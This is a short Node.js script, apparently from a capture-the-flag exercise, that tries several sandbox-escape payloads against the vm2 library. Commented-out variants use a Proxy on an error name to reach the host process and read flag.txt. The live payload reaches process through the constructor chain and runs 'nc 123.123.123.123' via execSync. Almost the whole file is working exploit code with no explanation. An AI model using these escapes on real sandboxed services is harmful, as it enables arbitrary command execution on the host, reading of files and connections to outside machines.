const {VM} = require("vm2");
const vm = new VM();
const fs = require("fs");
// const code = `let e=new Error();e.name={toString:new Proxy(()=>"",{apply(b,c,a){throw a.constructor.constructor("return process")().mainModule.require("fs").readFileSync("flag.txt")}})};try{e.stack}catch(o){o}`

// const code = `let e=new Error();e.name={toString:new Proxy(()=>"",{apply(b,c,a){throw a.constructor.constructor("return process")().mainModule.require("fs").readFileSync("../flag.txt")}})};try{e.stack}catch(o){o}`

// const code = `{t:new Proxy(()=>"",{apply(b,c,a){throw a.constructor.constructor("return process")().mainModule.require("child_process").execSync("nc 123.123.123.123").toString()}})}//`
const code = `'a'.constructor.constructor("return process")().mainModule.require("child_process").execSync("nc 123.123.123.123").toString()`
console.log(vm.run(code));